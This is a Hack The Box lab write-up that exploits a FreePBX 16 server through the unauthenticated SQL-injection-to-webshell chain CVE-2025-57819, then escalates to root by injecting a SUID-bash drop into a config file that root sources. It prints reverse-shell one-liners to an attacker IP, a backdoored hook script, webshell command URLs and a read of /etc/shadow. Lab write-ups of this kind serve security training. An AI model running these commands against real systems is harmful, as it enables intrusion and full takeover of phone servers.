# Connected — HTB Seasonal Lab

**Difficulty:** Easy
**OS:** Linux
**Target:** FreePBX / Asterisk PBX

---

## Recon

Full port scan:

```bash
sudo nmap -p- --min-rate 5000 -Pn <target-ip> -oN connect.txt
```

Three ports open:

* `22/tcp` — OpenSSH 7.4
* `80/tcp` — Apache 2.4.6 (CentOS), PHP 7.4.16
* `443/tcp` — same stack

`80` redirects to `/admin`, which redirects again to `config.php`.

TLS cert on `443`:

```
commonName = pbxconnect
```

Combined with the `/admin` path, this is a strong indicator of FreePBX. Confirmed the exact version from the login page:

```
FreePBX 16.0.40.7
```

This version has a known **unauthenticated SQL injection → RCE** chain: **CVE-2025-57819**.

### Note: MTU issue

`config.php` hung indefinitely on first load — not a WAF, not rate limiting. The tunnel MTU was fragmenting packets on the path to this lab network.

```bash
ip link show tun0
sudo ip link set dev tun0 mtu 1200
```

After lowering the MTU, requests started resolving normally. Worth checking early if HTTP requests silently die for no reason.

---

## Initial Foothold — CVE-2025-57819

`/admin/ajax.php` in FreePBX 16.0.40.7 has an unauthenticated SQL injection. Instead of dumping data directly, the exploit uses the injection to write into FreePBX's internal cron job table. FreePBX's own scheduler periodically reads that table and executes the rows as real cron jobs — so the SQLi plants a job that becomes RCE once the scheduler picks it up (~2 minutes later). The job drops a PHP webshell into the web root. No authentication required anywhere in the chain.

Used the watchTowr PoC:

```bash
git clone https://github.com/watchtowrlabs/watchTowr-vs-FreePBX-CVE-2025-57819.git
cd watchTowr-vs-FreePBX-CVE-2025-57819
python3 watchTowr-vs-FreePBX-CVE-2025-57819.py -H http://<target-ip>/
```

Wait ~2 minutes for the cron job to fire. The script prints the planted webshell path on success:

```
[+] VULNERABLE - webshell found: http://connected.htb/<random>.php
```

> Note: the printed URL uses the box's hostname (`connected.htb`), not the IP — add it to `/etc/hosts` first:
> ```bash
> echo "<target-ip> connected.htb" | sudo tee -a /etc/hosts
> ```

Verify the webshell:

```bash
curl -s "http://connected.htb/<webshell-path>.php?cmd=id"
# uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
```

### Upgrading to an interactive shell

```bash
# listener
nc -lvnp 4444
```

```bash
# via the webshell — makes the target connect back to the listener
curl -s "http://connected.htb/<webshell-path>.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/<your-tun0-ip>/4444%200%3E%261%27"
```

Stabilize the shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z, then on the attacker host:
stty raw -echo; fg
# press enter twice
```

Grab the user flag:

```bash
find / -name user.txt 2>/dev/null
cat /home/<user>/user.txt
```

---

## Privilege Escalation

### Dead ends

```bash
sudo -l                                          # needs a password
find / -perm -4000 -type f 2>/dev/null           # nothing juicy
find / -writable -type f -user root 2>/dev/null  # nothing useful
```

### Enumerating incron

`incron` (inotify + cron) is easy to overlook compared to regular cron. Checked it directly:

```bash
cat /etc/incron.d/*
```

Several entries run as **root**, triggered by writes to files under `/var/spool/asterisk/sysadmin/`. Two stood out:

```
/var/spool/asterisk/incron               IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE  /usr/bin/sysadmin_manager $#
/var/spool/asterisk/sysadmin/dahdi_restart  IN_CLOSE_WRITE                  /usr/sbin/sysadmin_dahdi_restart
```

### Attempt 1 — `sysadmin_manager` (dead end, but instructive)

`sysadmin_manager` runs as root and executes "hook" scripts inside FreePBX module folders — but only if a `module.sig` file next to the hook validates. Found a writable hook:

```bash
ls -la /var/www/html/admin/modules/ucp/hooks/
# -rwxrwxr-x 1 asterisk asterisk  logrotate
```

Backdoored it and tried to patch the signature file to match:

```bash
cat > /var/www/html/admin/modules/ucp/hooks/logrotate << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/<attacker-ip>/4445 0>&1
EOF

NEW_HASH=$(sha256sum /var/www/html/admin/modules/ucp/hooks/logrotate | awk '{print $1}')
sed -i "s/hooks\/logrotate = .*/hooks\/logrotate = $NEW_HASH/" \
    /var/www/html/admin/modules/ucp/module.sig
touch /var/spool/asterisk/incron/ucp.logrotate
```

**This does not work.** `module.sig` is not a plain checksum manifest — it's a full **PGP clearsigned message**:

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1
...
hooks/logrotate = 13cf7bd4...
```

Clearsigning cryptographically binds the entire block to the signature at the bottom. Editing the hash line with `sed` just invalidates the signature — it doesn't forge a new one. Confirmed by pulling the verification logic straight out of the binary:

```bash
strings /usr/bin/sysadmin_manager | grep -i -A3 -B3 "checkSig"
```

```php
$verify = $g->checkSig($sigfile);
if (!isset($verify['hashes'])) { exit; }
if (!isset($verify['config']['signedwith'])) { exit; }
$signedwith = $verify['config']['signedwith'];
if (!isset($whitelist[$signedwith])) { exit; }
```

Real GPG verification, gated on a hardcoded key whitelist. Checked for a usable private key just to be thorough:

```bash
find / -iname "*secring*" 2>/dev/null
ls -la /home/asterisk/.gnupg/secring.gpg
# -rw-rw-r-- 1 asterisk asterisk 0 ...
```

Zero bytes — no key. This is a properly implemented control, not a bypassable one. **Lesson: don't assume every "signature check" on a box is theater — sometimes it's doing its job, and the actual hole is somewhere else nearby.**

### Attempt 2 — `sysadmin_dahdi_restart` (this works)

Different incron entry, no signature check anywhere near it:

```bash
strings /usr/sbin/sysadmin_dahdi_restart
```

```sh
#!/bin/sh
/etc/init.d/asterisk stop
sleep 5
/etc/init.d/dahdi restart
sleep 5
...
```

`/etc/init.d/dahdi` does this near the top:

```bash
grep -n "init.conf" /etc/init.d/dahdi
# [ -r /etc/dahdi/init.conf ] && . /etc/dahdi/init.conf
```

That's a **dot-source**, not a subprocess call — the file's contents execute inline, in the same root shell, as if typed directly.

```bash
ls -l /etc/dahdi/init.conf
# -rw-r--r-- 1 asterisk asterisk 863 ...
```

Writable by `asterisk`. No signature, no hash, no validation. This is the actual hole — a config file sourced by root with zero checks on who can write to it.

```bash
printf '\n install -m 4755 /bin/bash /home/asterisk/pwn1 \n' >> /etc/dahdi/init.conf
touch /var/spool/asterisk/sysadmin/dahdi_restart
```

Wait for the trigger to fire — two `sleep 5`s plus service restart overhead, so give it 20–25 seconds:

```bash
sleep 25
ls -la /home/asterisk/pwn1
# -rwsr-xr-x 1 root root 964536 ...
```

SUID root bash. Execute it with `-p` to preserve privileges:

```bash
./pwn1 -p
id
# uid=999(asterisk) gid=1000(asterisk) euid=0(root) groups=1000(asterisk)
```

`euid=0(root)` is what matters here — effective UID, not real UID, governs actual permissions. Confirmed with a root-only file:

```bash
cat /etc/shadow
cat /root/root.txt
```

Root.

---

## Three things that made this look broken when it wasn't

1. **`/tmp` lied.** First attempt wrote the SUID binary to `/tmp/pwn1`. `ps aux` confirmed the chain really was running as root — yet the file never showed up. `dahdi.service` is a systemd unit with `PrivateTmp=true`, so it gets its own private `/tmp`, invisible from the shell. Root did exactly what was asked; the output just landed somewhere else. Moved the target path to `/home/asterisk/` and it appeared instantly.

2. **Leftover garbage from an earlier attempt blocked everything after it.** An earlier raw reverse-shell one-liner left in `/etc/dahdi/init.conf`:
   ```
   bash -i >& /dev/tcp/<attacker-ip>/4545 0>&1
   ```
   Since the file is *sourced*, not run as a standalone script, every line executes in sequence in the same shell. With no listener up, that line just hangs forever trying to connect — everything after it, including the real payload, never runs. Silent, no error. Had to `cat -A` the file to spot and strip it out.

3. **Checked too fast.** Two `sleep 5`s plus a full service stop/restart is not instant. Checking for the output file immediately after triggering, more than once, just meant not waiting long enough. `sleep 25` before checking fixed it on the next attempt, once the other two issues were also resolved.

---

## Flags

```bash
cat /home/asterisk/user.txt
cat /root/root.txt
```

---

## Summary

| Stage | Technique |
|---|---|
| Recon | Version fingerprinting via TLS cert + login page → FreePBX 16.0.40.7 |
| Foothold | CVE-2025-57819 — unauthenticated SQLi into FreePBX's cron table → scheduler executes it → webshell dropped |
| Privesc (dead end) | `sysadmin_manager` hook signing — real PGP clearsign verification, not forgeable without the private key |
| Privesc (working) | `sysadmin_dahdi_restart` → `/etc/init.d/dahdi` dot-sources `/etc/dahdi/init.conf`, which is `asterisk`-writable and unvalidated → inject SUID bash drop → root |
